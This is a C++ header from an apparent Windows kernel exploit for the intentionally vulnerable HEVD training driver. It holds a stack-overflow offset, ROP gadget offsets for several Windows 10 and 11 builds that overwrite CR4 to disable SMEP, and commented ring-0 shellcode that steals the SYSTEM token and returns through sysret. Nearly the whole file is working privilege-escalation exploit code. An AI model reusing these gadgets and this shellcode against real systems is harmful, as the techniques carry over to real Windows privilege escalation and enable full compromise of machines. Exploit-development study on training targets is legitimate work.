#pragma once
#include <vector>

#define BANNER \
R"(

  _      ___         __                 __ __                 __  ____           __     _ __ 
 | | /| / (_)__  ___/ /__ _    _____   / //_/__ _______  ___ / / / __/_ __ ___  / /__  (_) /_
 | |/ |/ / / _ \/ _  / _ \ |/|/ (_-<  / ,< / -_) __/ _ \/ -_) / / _/ \ \ // _ \/ / _ \/ / __/
 |__/|__/_/_//_/\_,_/\___/__,__/___/ /_/|_|\__/_/ /_//_/\__/_/ /___//_\_\/ .__/_/\___/_/\__/ 
   __ _______   _____          ______           __   ____               /_/__                
  / // / __/ | / / _ \  ____  / __/ /____ _____/ /__/ __ \_  _____ ____/ _/ /__ _    __      
 / _  / _/ | |/ / // / /___/ _\ \/ __/ _ `/ __/  '_/ /_/ / |/ / -_) __/ _/ / _ \ |/|/ /      
/_//_/___/ |___/____/       /___/\__/\_,_/\__/_/\_\\____/|___/\__/_/ /_//_/\___/__,__/       
                                                                                             
[*] HEVD Kernel Exploit by Red Meow ;)
[*] Stack Based Buffer Overflow with SMEP, kASLR, KVA Shadow Evasion Technique)"

#define OFFSET 2072

// ROP
// 0 = Windows 10 Pro        Build 19045
// 1 = Windows 10 Enterprise Build 14393
// 2 = Windows 11 Pro        Build 22631.2861

std::vector<std::vector<unsigned long long>> ROP_Gadgets = {
	{
		0x38f6a3, // 0  - xor ecx, ecx ; mov rax, rcx ; ret
		0x86b3de, // 1  - pop rdx ; ret
		0xa1a718, // 2  - add rsp, 0x20 ; ret
		0x8889f4, // 3  - push rax, pop rdi ; ret
		0x80fe3c, // 4  - jmp rdi
		0x93fc3a, // 5  - mov rcx, r8 ; mov rax, rcx ; ret
		0x254656, // 6  - xchg r8, r13 ; ret
		0x5b59c4, // 7  - push rax ; pop r13 ; ret
		0x30e0a0, // 8  - pop r8 ; ret
		0x3a06a7, // 9  - mov cr4, rcx ; ret
		0x249094, // 10 - pop rcx ; ret
	},
	{
		0x13b44d, // 0  - add esp, edi ; ret
		0x7b5c65, // 1  - pop rdx ; ret
		0x4feb94, // 2  - add rsp, 0x20 ; pop r12 ; ret
		0,
		0,
		0,
		0,
		0,
		0,
		0x3d6431, // 9   - mov cr4, rcx ; ret
		0x3c897d, // 10  - pop rcx ; ret
	},
	{
		0x5be90a, // 0  - xor ecx, ecx ; mov rax, rcx ; ret
		0x7e4242, // 1  - pop rdx ; ret
		0xaf7748, // 2  - add rsp, 0x20 ; ret
		0x58bb65, // 3  - push rax, pop rdi ; ret
		0x5a1b59, // 4  - jmp rdi
		0x89b158, // 5  - mov rcx, r8 ; mov rax, rcx ; ret
		0x651631, // 6  - xchg r8, r13 ; test al, 0xCF ; ret
		0x58bea7, // 7  - push rax ; pop r13 ; ret
		0x22f33c, // 8  - pop r8 ; ret
	}
};

std::vector<unsigned long long> ROP_ExploitData = {
	0x1000,
	0x100,
	0x70678, // CR4 Value
	0xfffffffffffff7d0 // -0x830
};

char win11Ring0Shellcode[] =
// Windows 11 Structure Layouts :
// _KPCR          -   https://www.vergiliusproject.com/kernels/x64/windows-11/23h2/_KPCR
// _KPRCB         -   https://www.vergiliusproject.com/kernels/x64/windows-11/23h2/_KPRCB
// _KTHREAD       -   https://www.vergiliusproject.com/kernels/x64/windows-11/23h2/_KTHREAD
// _KTRAP_FRAME   -   https://www.vergiliusproject.com/kernels/x64/windows-11/23h2/_KTRAP_FRAME

// Find and Copy SYSTEM Security Token then Paste on our _EPROCESS
"\x65\x48\x8b\x04\x25\x88\x01"  // 0x0  -  mov    rax,QWORD PTR gs:0x188	 ;  Get Pointer to _KPCRB.CurrentThread // _KTHREAD
"\x00\x00"                      // 0x7										 ;  
"\x48\x8b\x80\xb8\x00\x00\x00"  // 0x9  -  mov    rax,QWORD PTR [rax+0xb8]	 ;  ApcState.Process* // Current _EPROCESS
"\x49\x89\xc0"                  // 0x10 -  mov    r8,rax					 ;  Store Pointer to Current _EPROCESS
"\x4d\x8b\x80\x48\x04\x00\x00"  // 0x13 -  mov    r8,QWORD PTR [r8+0x448]	 ;  ActiveProcessLinks
"\x49\x81\xe8\x48\x04\x00\x00"  // 0x1a -  sub    r8,0x448					 ;  Back to Top of _EPROCESS
"\x4d\x8b\x88\x40\x04\x00\x00"  // 0x21 -  mov    r9,QWORD PTR [r8+0x440]	 ;  Store Current PID
"\x49\x83\xf9\x04"              // 0x28 -  cmp    r9,0x4					 ;  Check is SYSTEM PID
"\x75\xe5"                      // 0x2c -  jne    -0x19						 ;  If not SYSTEM PID, back to offset 0x13 to loop
"\x49\x8b\x88\xb8\x04\x00\x00"  // 0x2e -  mov    rcx,QWORD PTR [r8+0x4b8]	 ;  Get Pointer to SYSTEM Token
"\x80\xe1\xf0"                  // 0x35 -  and    cl,0xf0					 ;  Get Clean Pointer of _EX_FAST_REF Structure
"\x48\x89\x88\xb8\x04\x00\x00"  // 0x38 -  mov    QWORD PTR [rax+0x4b8],rcx	 ;  Paste SYSTEM Token Pointer to the Exploit

// Simulate the Behavior of the syscall End
// https://kristal-g.github.io/2021/05/08/SYSRET_Shellcode.html
"\x65\x48\x8b\x04\x25\x88\x01"  // 0x3f -  mov    rax,QWORD PTR gs:0x188	 ;  Get Pointer to _KPCR.CurrentPrcb.CurrentThread
"\x00\x00"                      // 0x46										 ;  
// No need to add KernelApcDisable, because unknow reason
// https://github.com/tongzx/nt5src/blob/master/Source/XPSP1/NT/base/ntos/inc/ke.h#L1740
"\x48\x8b\x90\x90\x00\x00\x00"  // 0x56 -  mov    rdx,QWORD PTR [rax+0x90]	 ;  Get Pointer to CurrentThread.TrapFrame (_KTRAP_FRAME)
"\x48\x8b\x8a\x68\x01\x00\x00"  // 0x5d -  mov    rcx,QWORD PTR [rdx+0x168]	 ;  Recover from TrapFrame.Rip
"\x4c\x8b\x9a\x78\x01\x00\x00"  // 0x64 -  mov    r11,QWORD PTR [rdx+0x178]	 ;  Recover from TrapFrame.EFlags
"\x48\x8b\xa2\x80\x01\x00\x00"  // 0x6b -  mov    rsp,QWORD PTR [rdx+0x180]	 ;  Recover from TrapFrame.Rsp
"\x48\x8b\xaa\x58\x01\x00\x00"  // 0x72 -  mov    rbp,QWORD PTR [rdx+0x158]	 ;  Recover from TrapFrame.Rbp
"\x31\xc0"                      // 0x79 -  xor    eax,eax					 ;  Simulate NTSTATUS STATUS_SUCCESS
"\x0f\x01\xf8"                  // 0x7b -  swapgs   						 ;  
"\x48\x0f\x07"                  // 0x7e -  sysretq  						 ;  
;